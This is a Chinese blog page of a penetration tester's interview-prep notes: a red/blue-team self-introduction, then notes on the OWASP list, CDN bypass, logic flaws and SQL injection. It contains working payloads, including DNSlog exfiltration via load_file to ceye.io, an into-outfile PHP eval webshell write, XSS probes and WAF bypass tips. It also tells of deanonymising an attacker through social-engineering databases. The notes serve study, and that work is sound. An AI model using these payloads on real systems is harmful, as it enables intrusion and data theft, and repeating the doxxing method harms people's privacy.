<!DOCTYPE html>
<html lang="en">
<style>
    p{
        margin-top: 0 !important;
        margin-bottom: 1rem !important;
        font-size: 1.1rem;
    }
    figure{
        margin: 0 !important;
    }
    pre{
        padding: 0 !important;
        margin-top: 0 !important;
        margin-bottom: 1rem !important;
    }

    td{
        padding: 0 !important;
        margin-bottom: 1rem !important;
    }
    h1,h2,h3,h4,h5,h6{
        margin-top: 0 !important;
        margin-bottom: 1rem !important;
    }
</style>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RFpwner - photo</title>
    <link rel="stylesheet" href="/css/styles.css">
    <link rel="stylesheet" href="/css/tailwind.css">
    <link rel="stylesheet" href="/css/highlight.css">
    
<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
    <div class="container mx-auto flex items-center justify-between space-x-8">
    
      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
        <a href="/" class="hover:text-white transition-colors select-none">
          RFpwner
        </a>
      </h1>
  
    <!-- 大屏幕 -->
      <nav class="hidden md:block">
        <ul class="flex space-x-6">
          
            <li>
              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                RFpwner
              </a>
            </li>
          
            <li>
              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Archives
              </a>
            </li>
          
            <li>
              <a href="/categories" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Categories
              </a>
            </li>
          
            <li>
              <a href="/tags" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Tags
              </a>
            </li>
          
            <li>
              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                About
              </a>
            </li>
          
            <li>
              <a href="/rss.xml" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                RSS
              </a>
            </li>
          
        </ul>
      </nav>
  
      <!-- 小屏幕 -->
      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
        </svg>
      </button>
    </div>
  
    <!-- 折叠菜单 -->
    <nav id="mobile-menu" class="hidden bg-black">
      <ul class="space-y-2 py-4 px-6">
        
          <li>
            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
              RFpwner
            </a>
          </li>
        
          <li>
            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
              Archives
            </a>
          </li>
        
          <li>
            <a href="/categories" class="block text-white hover:text-hacker-color1 transition-colors">
              Categories
            </a>
          </li>
        
          <li>
            <a href="/tags" class="block text-white hover:text-hacker-color1 transition-colors">
              Tags
            </a>
          </li>
        
          <li>
            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
              About
            </a>
          </li>
        
          <li>
            <a href="/rss.xml" class="block text-white hover:text-hacker-color1 transition-colors">
              RSS
            </a>
          </li>
        
      </ul>
    </nav>
  
    <!-- RSS Link -->
    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
  </header>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="/js/search.js"></script>
  <script>
        document.addEventListener("DOMContentLoaded", () => {
    const menuToggle = document.getElementById("menu-toggle");
    const mobileMenu = document.getElementById("mobile-menu");

    menuToggle.addEventListener("click", () => {
        if (mobileMenu.classList.contains("hidden")) {
        mobileMenu.classList.remove("hidden");
        } else {
        mobileMenu.classList.add("hidden");
        }
    });
    });

  </script>
  

<meta name="generator" content="Hexo 7.3.0"></head>
<body class="bg-black text-hacker-color3 container mx-auto">
    <!-- 文章标题 -->
    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">photo</h1>

    <!-- 发布时间 -->
    <p class="text-hacker-color3 text-center text-sm mb-4">
        2025-03-04
    </p>

    <!-- 文章内容 -->
    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight">
        <h1 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h1><p>目前做的是渗透测试工程师,对客户的资产进行渗透测试并提供修复建议，有两年工作经验，参加过三次国护网，一次重保，参加过一次郑州市hvv红队，打穿内网刷分，2019年在深交所担任监控研判工作。2021年在中国出口信用保险担任溯源应急工作，平时喜欢挖一些SRC，有多本CNVD通用证书和EDU证书，经常参加CTF比赛，获得第五、六届河南省信息安全对抗大赛一等奖和应急响应赛二等奖。</p>
<p>之前一直做的是短期外包项目，没有固定公司，和你们这个项目差不多所以工作经验没办法写，只能写项目经验。我之前的话做的很多都是渗透和红蓝对抗的项目，三次国护网蓝队中级，一次重保，一次市护网红队，还有一些渗透测试的项目。平时的话挖一些SRC，有cnvd通用证书和一些edu证书。蓝队护网和重保主要对安全设备的监控、应急响应和溯源的工作。去年打市护网的话，就是通过打点学校政府，因为这些防护一般做的不是很好。当时就是找到一所高校的党建系统存在shiro反序列化漏洞，然后通过这个漏洞命令执行，上webshell，当时以为是存在杀软，通过mysql的udf提权，拿到system权限，上cs马抓到了管理员的账号密码，并且内网开了3389，搭建隧道打通内网。之后就是内网的信息收集，fscan扫描，做横向渗透。农行当时有好几套系统需要做渗透，有一套模板是包含了web，小程序和app，在测试环境发现多个系统存在平行越权、 默认口令、信息泄露、短信轰炸等漏洞。</p>
<p>本科读的是信息安全，目前是在西安电子科技大学的网络与信息安全专业读研究生，21年的时候，去面试面到了监测的岗位，在项目现场主要就是看天眼，和通过防火墙去封ip，第二年，使使劲面上了研判，当时是去的长安汽车，这一年印象比较深的是一次溯源的经历，当时安全设备检测到一个钓鱼邮件，通过看天眼和外联情况，然后联系甲方的负责人发放了钓鱼邮件的通知，之后是对这个外联设备应急，网络隔离加快照备份，然后看钓鱼邮件的时候，发现有一个压缩包，里面有俩文件，一个是通过RLO伪装成xls的exe，一个是一个dll文件，通过白加黑和自解压的方式进行的免杀上线，把钓鱼邮件删除之后，查杀内存马，因为比较及时，所以当时没有发现内存马，然后当时是查看了下最近修改的文件，以防止dll劫持，之后看隐藏账户，进程，注册表自启动和服务，就应急那一套，发现都没有异常，用杀软全盘杀毒扫描木马查杀，因为是办公区的电脑，所以不考虑webshell，猜测是可能还没有来得及下一步操作，把ip加入黑名单后，分析了一下这个钓鱼邮件，是他们甲方的一个工作人员邮箱是那种有规则的密码，邮箱还就是简单的名字简称，通过top500的姓氏字典撞库之后，发现有好几人的账户有危险，让紧急修改了。溯源的时候，主要从外联的c2ip进行入手，在微步搜索这个ip，发现这个ip没有经过域前置和cdn处理，ip反查后发现有域名存在，通过域名的whois查询搞到了qq邮箱，但是不确定身份，通过全端口扫描发现8080，5003和13443开放web服务，打开之后发现是arl灯塔和awvs漏扫，访问域名之后发现是一个博客，里面全都是渗透的相关文章，肯定就是干安全的了，然后博客里有qq，和之前whois查到的qq邮箱是一样的，通过qq忘记密码去看到手机号前后的几位数，用社工库查邮箱手机号，与其对应上了，然后查看了手机号的归属地是河北邢台的，去支付宝，钉钉，微信，qq，微博那些社交平台去查询，确定是一个人，并且查到了姓名，在支付宝的资料里，有个自己真人照片<br>的证件照，背景有很糊的奇安信水印，加上联系方式之后发现确实是奇安信的工作人员，至此就可以确定攻击ip，qq，域名，姓名，手机号，地理位置，邮箱，公司，然后撰写了溯源报告。上年的项目比较特殊，奇安信这边只有我一个中级驻场，而且因为当时去到的甲方是第一次参加hw，他们对于hw要干什么都比较陌生，当时hw都已经开始了，我们这边还无法登录态势，因为他们自己内部的vpn出现了问题，并且态势这些没有挂到vpn上，后面能登录了，发现态势并没有流量，经过开会才知道他们的一城一池流量，并没有走态势，是他们后续进行了流量引流之后，经过四五天，各个地市的流量在陆续在态势能看到，我们才能看到流量，他们的防火墙也是，各个地市之间相互独立，所以当时没有好的解决方法下，只能是我自己写了一个py脚本，然后每次提前去半小时，抓一下token和cookie去进行一个更新，来进行统一的防火墙封禁，增加封禁效率，因为不是主防单位，可能也没有红队大哥太过发力，和新华三的2个同事安稳度过了hw，因为本身在杭州，后续是过了不到一两个月就去亚运会重保了，当时印象比较深的是根据下发的线索，有一个服务器失陷了，和服务器运维的工作人员一起去排查，发现了webshell，然后进行了清除，并排查了是否存在权限维持的后门，和其他的渗透痕迹，还有就是查云waf的全流量日志的时候，通过异常的HTTP请求发现了sql的payload，通过估算，有大量人员的信息泄露，查看事发的oracle的执行日志，确定已经攻击成功了，事发的OA是双因子认证，必须是账号加企业微信同时满足才能登录，和其他同事排查之后发现是企业微信的0day，攻击者通过0day调用了企业微信的API将自己加入了企业内部完成认证，一些安全设备的问题，去和二线人员进行一些沟通</p>
<p>企业微信0day漏洞可以在&#x2F;cgi-bin&#x2F;gateway&#x2F;agentinfo接口未授权情况下可直接获取企业微信secret等敏感信息，可导致企业微信全量数据被获取。</p>
<p>漏洞危害</p>
<p>①可导致企业微信全量数据被获取、文件获取，</p>
<p>②存在使用企业微信轻应用对内发送钓鱼文件和链接等风险。</p>
<h1 id="OWASP-Top-10"><a href="#OWASP-Top-10" class="headerlink" title="OWASP Top 10:"></a>OWASP Top 10:</h1><p>SQL注入防护方法</p>
<p>失效的身份认证和会话管理</p>
<p>跨站脚本攻击xss</p>
<p>直接引用不安全的对象</p>
<p>安全配置错误</p>
<p>敏感信息泄露</p>
<p>缺少功能级的访问控制</p>
<p>跨站请求伪造csrf</p>
<p>使用含有已知漏洞的组件</p>
<p>未验证的重定向和转发</p>
<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><ul>
<li>暴力破解</li>
<li>任意用户登录  验证码返回包</li>
<li>支付漏洞            </li>
<li>越权漏洞</li>
<li>未授权访问</li>
<li>短信轰炸</li>
</ul>
<h1 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h1><p>确认目标:收集公司资产信息，通过爱企查了解公司组织架构及域名</p>
<p>信息收集:IP,子域名,whois信息,端口,子站,敏感信息,指纹识别，github，代码托管。通过fofa、鹰图、夸克。找特征、google语法，判断CDN，绕过CDN</p>
<h3 id="判断和绕过cdn"><a href="#判断和绕过cdn" class="headerlink" title="判断和绕过cdn"></a>判断和绕过cdn</h3><ol>
<li><p>确定目标网站是否使用了CDN:</p>
<ul>
<li>查看网站的DNS记录,看是否有CDN提供商的域名</li>
<li>检查网页代码中是否有CDN服务商的资源引用</li>
<li>使用在线工具(如BuiltWith、Wappalyzer等)检测网站是否使用CDN</li>
</ul>
</li>
<li><p>识别CDN的类型和配置:</p>
<ul>
<li>确定CDN提供商是谁(Cloudflare、Fastly、Akamai等)</li>
<li>了解CDN的工作原理和特点,如缓存策略、IP范围等</li>
</ul>
</li>
<li><p>绕过CDN的方法:</p>
<ul>
<li><p>直接访问源站IP地址,绕过CDN</p>
</li>
<li><p>寻找CDN配置漏洞或错误配置,如绕过缓存、绕过WAF等</p>
</li>
<li><p>利用代理&#x2F;VPN等隐藏真实IP地址</p>
</li>
<li><p>利用DNS劫持等技术直接访问源站</p>
</li>
<li><p>1、子域名入手　　多数网站主站用了CDN，子域名等不用（CDN很贵）可以直接用子域名入手（反正都是一个大网站上的）方法：subDomainsBrute、Sublist3r、Google hack（谷歌黑客语法）等，利用网站查询:<a target="_blank" rel="noopener" href="https://dnsbd.io/zh-cn/">https://dnsbd.io/zh-cn/</a></p>
<p>2、用web漏洞解决，如xss（后面学）、ssrf（不知道）、命令反弹shell（之前学过，在永恒之蓝那里）等</p>
<p>3、历史DNS记录　　查询IP与域名绑定历史记录，可能会发现使用CDN之前的目标IP</p>
<p>查询网站有<a target="_blank" rel="noopener" href="https://dnsbd.io/zh-cn/">https://dnsbd.io/zh-cn/</a></p>
<p><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
<p><a target="_blank" rel="noopener" href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a></p>
<p><a target="_blank" rel="noopener" href="http://viewdns,info/">http://viewdns,info/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.17ce.com/">http://www.17ce.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://community.riskiq.com/">https://community.riskiq.com/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.crimeflara.com/cfssl.html">http://www.crimeflara.com/cfssl.html</a></p>
<p>4、CDN本身找　　社工！！！（我不会）</p>
<p>5、Mx记录或邮件　　邮件等信息啥的会直接绕过CDN，在邮件的DNS（应该在F12里）中有相关的真实IP</p>
<p>6、用国外的代理就有可能直接搜到，国内CDN对国外的覆盖面不够广，有可能找到</p>
<p><a target="_blank" rel="noopener" href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></p>
</li>
</ul>
</li>
<li><p>测试和验证:</p>
<ul>
<li>使用各种方法尝试访问目标,验证是否成功绕过CDN</li>
<li>记录绕过CDN的过程和方法,以备后续使用</li>
</ul>
</li>
</ol>
<p>一、什么是CDN？<br>CDN (内容分发网络) 指的是一组分布在各个地区的服务器。这些服务器存储着数据的副本，因此服务器可以根据哪些服务器与用户距离最近，来满足数据的请求。CDN 提供快速服务，较少受高流量影响。<br>通俗来讲，CDN就是用来加速访问的。例如百度引擎，全国几亿人每天都在时不时使用百度进行内容搜索，如果只靠自身的服务器是很难支撑的，这个时候百度就使用了CDN技术，在全国各处设置CDN节点，当用户使用百度引擎时，其实就是在使用离用户最近的百度CDN节点来搜索内容。</p>
<p>二、CDN对渗透测试的影响？<br>隐藏真实源IP，导致对目标IP测试错误</p>
<p>1.传统访问：用户访问域名–&gt;解析服务器IP–&gt;访问目标主机<br>2.普通CDN：用户访问域名–&gt;CDN节点–&gt;真实服务器IP–&gt;访问目标主机<br>3.带WAF的CDN：用户访问域名–&gt;CDN节点（WAF）–&gt;真实服务器IP–&gt;访问目标主机</p>
<p>漏洞探测:XSS,CSRF,SSRF,SQL注入,越权访问,命令执行,弱口令,文件上传,暴力破解等</p>
<p>漏洞利用:提升权限</p>
<p>日志清理</p>
<h1 id="app"><a href="#app" class="headerlink" title="app"></a>app</h1><p>反编译，查看源码内是否存在敏感信息，比如ak、sk泄露。</p>
<p>抓包，和测试web一样，api调用</p>
<p>优惠券</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">反编译 app:</span><br><span class="line">将 app 的二进制代码反编译成可读的源代码形式</span><br><span class="line">目的是查看代码中是否存在一些敏感信息泄露,如 API 密钥(AK/SK)等</span><br><span class="line">抓包分析:</span><br><span class="line">使用抓包工具监控 app 与服务器之间的网络通信</span><br><span class="line">分析 API 调用过程,了解 app 的功能和交互细节</span><br><span class="line">优惠券相关攻击:</span><br><span class="line">针对 app 中的优惠券功能进行攻击</span><br><span class="line">可能涉及优惠券生成算法的逆向分析、优惠券的重复使用等</span><br></pre></td></tr></table></figure>



<h1 id="登录页面"><a href="#登录页面" class="headerlink" title="登录页面"></a>登录页面</h1><p>看框架，shiro反序列化</p>
<p>无验证码，爆破</p>
<p>注入：</p>
<ol>
<li><strong>手动测试</strong><ul>
<li>尝试在登录框中输入单引号(‘)、双引号(“)、反引号(&#96;)等特殊字符,观察页面是否出现错误信息,这可能暴露 SQL 注入漏洞。</li>
<li>尝试在登录框中输入 <code>1 OR 1=1</code> 或 <code>1 AND 1=2</code> 等恶意 SQL 语句,观察页面行为是否有异常。</li>
</ul>
</li>
<li><strong>使用自动化扫描工具</strong><ul>
<li>可以使用 SQLmap、Burp Suite、ZAP 等专业的 SQL 注入扫描工具,对登录页面进行自动化检测。这些工具可以自动识别并利用 SQL 注入漏洞。</li>
</ul>
</li>
<li><strong>检查页面源代码</strong><ul>
<li>查看登录页面的源代码,如果发现有拼接 SQL 语句的地方,且没有进行充分的输入验证,很可能存在 SQL 注入风险。</li>
</ul>
</li>
<li><strong>监测错误信息</strong><ul>
<li>仔细观察登录失败时的错误提示信息,如果包含数据库相关的信息,可能暴露了 SQL 注入漏洞的存在。</li>
</ul>
</li>
</ol>
<p>xss：</p>
<ol>
<li><strong>手动测试</strong><ul>
<li>尝试在登录框中输入一些常见的 XSS payload,如 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>、<code>&lt;img src=x onerror=alert(1)&gt;</code>等,观察页面是否出现弹窗或其他异常行为。</li>
<li>查看页面源代码,检查是否有未经过滤的用户输入被直接输出到页面中。</li>
</ul>
</li>
<li><strong>使用自动化扫描工具</strong><ul>
<li>可以使用 OWASP ZAP、Burp Suite 等安全扫描工具,对登录页面进行自动化的 XSS 检测。这些工具可以识别并利用各种 XSS 漏洞。</li>
</ul>
</li>
<li><strong>检查页面响应头</strong><ul>
<li>查看页面响应头中是否包含 <code>X-XSS-Protection</code> 或 <code>Content-Security-Policy</code> 等 XSS 防护相关的设置,这些可以一定程度上缓解 XSS 风险。</li>
</ul>
</li>
<li><strong>使用 XSS 检测工具</strong><ul>
<li>在线工具如 OWASP Xenotix XSS Exploit Framework、XSStrike 等可以帮助检测 XSS 漏洞。</li>
</ul>
</li>
</ol>
<p>未授权访问：</p>
<p>找回密码，逻辑</p>
<p>CSRF：</p>
<ol>
<li><strong>手动测试</strong><ul>
<li>尝试构造一个包含恶意行为的 CSRF 攻击页面,如发送一个修改密码的请求,观察是否能成功执行。</li>
<li>检查登录页面的表单是否包含 CSRF token 等防护机制。</li>
</ul>
</li>
<li><strong>使用自动化扫描工具</strong><ul>
<li>可以使用 OWASP ZAP、Burp Suite 等安全扫描工具,对登录页面进行自动化的 CSRF 检测。这些工具可以识别并利用 CSRF 漏洞。</li>
</ul>
</li>
<li><strong>检查页面源代码</strong><ul>
<li>查看登录页面的源代码,检查是否有使用 CSRF token、Referer 检查等防护措施。</li>
</ul>
</li>
<li><strong>监测网络请求</strong><ul>
<li>使用浏览器开发者工具或网络抓包工具,观察登录页面的各种请求,检查是否存在可能被 CSRF 利用的功能。</li>
</ul>
</li>
<li><strong>验证 Origin 和 Referrer 检查</strong><ul>
<li>尝试发送一个跨域的请求到登录页面,观察页面是否会对 Origin 和 Referrer 进行验证。</li>
<li><img src="/photo/image-20240609221741592.png" alt="image-20240609221741592"></li>
<li><img src="/photo/image-20240609221654413.png" alt="image-20240609221654413"></li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQL 注入:用户输入的数据如果没有经过严格的过滤和校验,可能会被注入恶意的 SQL 语句,导致数据泄露或系统控制权被窃取。</span><br><span class="line">跨站脚本(XSS):同样是输入数据未经充分过滤,可能被注入恶意的 JavaScript 代码,从而实现窃取用户 Cookie、会话劫持等攻击。</span><br><span class="line">CSRF(跨站请求伪造):如果登录页面的请求验证机制不够完善,攻击者可以伪造用户的请求进行登录,从而控制用户的账号。</span><br><span class="line">密码安全:如果密码存储机制不够安全(明文存储、加密算法不够安全等),一旦被黑客获取,用户的密码信息将面临泄露风险。</span><br><span class="line">暴力破解/字典攻击:如果登录页面的验证机制不够健壮,比如无限制登录尝试、无验证码等,可能会被利用进行暴力破解或字典攻击。</span><br><span class="line">会话管理:如果会话管理机制不够完善,可能会导致用户会话被劫持,从而被攻击者利用。</span><br><span class="line">SSL/TLS配置:如果SSL/TLS配置不当,可能会导致通信被监听或中间人攻击。</span><br></pre></td></tr></table></figure>



<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p>用户可以控制参数，输入的数据没有经过处理直接拼接到数据库执行</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul>
<li>提交方式分为：GET型、POST型、Cookie型</li>
<li>注入点分为：数字型、字符串型、搜索型</li>
<li>运行结果分为：基于时间的盲注、基于报错、基于布尔的盲注、基于数字</li>
</ul>
<h2 id="联合注入-order-by-uinon-select"><a href="#联合注入-order-by-uinon-select" class="headerlink" title="联合注入: order by , uinon select"></a>联合注入: order by , uinon select</h2><h2 id="报错注入-updatexml-concat-extractvalue"><a href="#报错注入-updatexml-concat-extractvalue" class="headerlink" title="报错注入:updatexml, concat, extractvalue"></a>报错注入:updatexml, concat, extractvalue</h2><p>select updatexml(1,make_set(3,’~’,(select user())),1)</p>
<p>select extractvalue(1, concat(0x5c,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1)))</p>
<p>floor函数和exp函数，一个是通过主键唯一来进行报错，一个是通过取对数溢出进行报错</p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注:"></a>盲注:</h2><p>布尔型盲注</p>
<p>MID(database(),1,1)&gt;‘a’ 查看数据库名第一位</p>
<p>substr(database(),1,)&gt;‘a’ 查看数据库名第一位，start为开始位置，length为截取的长度。</p>
<p>left(database(),2)&gt;‘ab’ 查看数据库名前2位</p>
<p>length 字符串长度</p>
<p>ascii	ASCII码</p>
<p>盲注函数:</p>
<p>sleep           benchmark        GET_LOCK </p>
<p>get_lock函数() 需要使用 mysql_pconnect函数来连接数据库。在一个session中可以先锁定一个变量例如：select get_lock(‘do9gy’ ,1)。然后通过另一个session再次执行get_lock（‘do9gy’ ，5）此时会产生5秒的延迟，其效</p>
<p>果类似于sleep(5)。</p>
<p>​        RLIKE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">在 SQL 注入攻击中,RLIKE 函数是一个非常强大的盲注函数。它主要用于在不显示查询结果的情况下,通过对数据库的响应时间或错误信息来判断查询条件是否成立。</span><br><span class="line"></span><br><span class="line">RLIKE 函数的语法如下:</span><br><span class="line"></span><br><span class="line">复制</span><br><span class="line">expression RLIKE pattern</span><br><span class="line">其中 expression 是要匹配的字符串表达式, pattern 是正则表达式模式。</span><br><span class="line"></span><br><span class="line">RLIKE 函数的工作原理如下:</span><br><span class="line"></span><br><span class="line">如果 expression 匹配 pattern, 则返回 1 (true)。</span><br><span class="line">如果 expression 不匹配 pattern, 则返回 0 (false)。</span><br><span class="line">在盲注攻击中, RLIKE 函数通常与 IF() 函数配合使用,示例如下:</span><br><span class="line"></span><br><span class="line">sql</span><br><span class="line">复制</span><br><span class="line">IF(ASCII(SUBSTRING(database(), 1, 1)) RLIKE &#x27;[a-z]&#x27;, 1, 0)</span><br><span class="line">这个查询会检查当前数据库名的第一个字符是否在 a-z 之间。如果是,返回 1,否则返回 0。攻击者可以通过观察查询的执行时间或错误信息,判断查询结果是否为 1,从而推断出数据库名的第一个字符。</span><br></pre></td></tr></table></figure>

<p>过滤之后的还有，笛卡尔积，</p>
<h3 id="盲注加速-二分法，dnslog外带"><a href="#盲注加速-二分法，dnslog外带" class="headerlink" title="盲注加速:二分法，dnslog外带"></a>盲注加速:二分法，dnslog外带</h3><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>select * from user where id &#x3D; 1;select database()</p>
<h2 id="Dns-log-注入"><a href="#Dns-log-注入" class="headerlink" title="Dns log 注入"></a>Dns log 注入</h2><p>通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录<br>此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志</p>
<p><code>and (select load_file(concat(&#39;//&#39;,(select database()),&#39;.fz3fjx.ceye.io/Gui&#39;)))</code> 这里要注意的一点就是你的域名前面一定要加. 而且域名后面的字符随便写 先查库名：mangzhu</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">什么是DNSlog注入</span><br><span class="line">DNSlog注入是一种利用DNS服务器记录域名解析请求的特性，来获取SQL注入结果的技术。它的原理是通过构造一个包含数据库信息的子域名，然后使用MySQL的load_file函数或其他方法，让目标服务器向DNS服务器发起解析请求，从而在DNS服务器上留下注入结果的痕迹。</span><br><span class="line"></span><br><span class="line">DNSlog注入的应用场景是当网站对于SQL注入的攻击没有回显或者过滤了敏感的回显内容时，可以使用DNSlog注入来绕过这些限制，获取数据库的信息。</span><br><span class="line">DNSlog注入的步骤如下：</span><br><span class="line"></span><br><span class="line">首先，需要一个可以记录DNS请求的平台，例如dnslog.cn和ceye.io。在这个平台上，可以获取一个专属的子域名，例如xxx.dnslog.cn，并且可以查看该子域名下所有的DNS请求记录。</span><br><span class="line">然后，需要构造一个包含数据库信息的子域名，例如(select database()).xxx.dnslog.cn。这个子域名可以使用MySQL的函数或者操作符来拼接，例如concat、replace、substr等。</span><br><span class="line">接着，需要使用MySQL的load_file函数或其他方法，让目标服务器向DNS服务器发起解析请求。例如，使用以下语句：</span><br><span class="line">select load_file(concat(‘\\\\’,(select database()),‘.xxx.dnslog.cn/abc’));</span><br><span class="line">这个语句会让目标服务器尝试从(select database()).xxx.dnslog.cn/abc这个地址加载文件，从而触发DNS解析请求。</span><br><span class="line">最后，需要在DNSlog平台上查看DNS请求记录，就可以获取数据库信息了。例如，在上面的例子中，如果数据库名为security，那么就会看到security.xxx.dnslog.cn这样的记录。</span><br></pre></td></tr></table></figure>



<h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理:"></a>宽字节注入原理:</h2><p>宽字节注入利用了mysql一个特性，<strong>即当mysql在使用GBK编码的时候，会认为两个字符是一个汉字</strong>。（前一个ASCII码<strong>要大于128</strong>，才到汉字的范围）</p>
<p>当输入单引号，经addslashes转义后，对应的url编码是：<br><strong>‘ –&gt; &#39; –&gt; %5C%27</strong><br>当在前面引入一个ASCII大于128的字符（比如%df），url编码变为：<br><strong>%df‘ –&gt; %df \ ‘ –&gt; （%df%5C）%27</strong></p>
<p>若使用gbk编码的话，<strong>%df%5C会被当作一个汉字处理</strong>，从而使%27（单引号）逃出生天，成功绕过</p>
<h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><p>编码绕过</p>
<p>大小写绕过</p>
<p>内联注释 &#x2F;*!65001sd*&#x2F;,%0a,&#x2F;**&#x2F;</p>
<p>参数污染 	多参数?id&#x3D;1&amp;id&#x3D;2</p>
<p>POST脏数据	前面添加大量无用数据,达到waf最大处理范围</p>
<p>模糊测试 fuzz</p>
<p>分块传输</p>
<h2 id="SQL注入防护"><a href="#SQL注入防护" class="headerlink" title="SQL注入防护"></a>SQL注入防护</h2><p>预编译，正则匹配过滤危险字符函数,强转类型为数字,添加waf</p>
<p>进行预编译之后，sql语句已经被数据库分析，编译和优化了，并且允许数据库以参数化的形式进行查询，所以即使有敏感字符数据库也会当做属性值来处理而不是sql指令了</p>
<h2 id="SQL注入拿shell"><a href="#SQL注入拿shell" class="headerlink" title="SQL注入拿shell"></a>SQL注入拿shell</h2><p>条件:</p>
<ol>
<li>知道web的绝对路径</li>
<li>具有可读可写权限</li>
</ol>
<p><code>into outfile</code> 将一句话木马写入 自动创建的 heason.php文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://afsgr16-b1ferw.aqlab.cn/?id=1 and 1=2 union select 1,&#x27;&lt;?php @eval($_REQUEST[8]);?&gt;&#x27; into outfile ‘C:\\phpStudy\\WWW\\heason.php’</span><br></pre></td></tr></table></figure>

<ul>
<li>1.上传文件路径，需要测试网站报错显示路径</li>
<li>2.路径需双写</li>
</ul>
<p><code>into dumpfile</code> 使用同上，区别是能接受16进制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://afsgr16-b1ferw.aqlab.cn/?id=1 and 1=2 union select 1,0x3c3f70687020406576616c28245f524551554553545b27636d64275d293b3f3e into outfile ‘C:\\phpStudy\\WWW\\heason.php’</span><br></pre></td></tr></table></figure>

<h1 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h1><p>SQL server 1433</p>
<p>oracle 		1521</p>
<p>mysql 		3306</p>
<p>DB2			5000</p>
<p>Redis		6379</p>
<p>pointbase	9092</p>
<p>tomcat	8080</p>
<p>WebLogic	7001</p>
<p>telnet 		23</p>
<p>Ftp			21</p>
<p>SSh 		22</p>
<p>文件共享 永恒之蓝		445</p>
<p>SMTP		25</p>
<p>SMB 打印机    139</p>
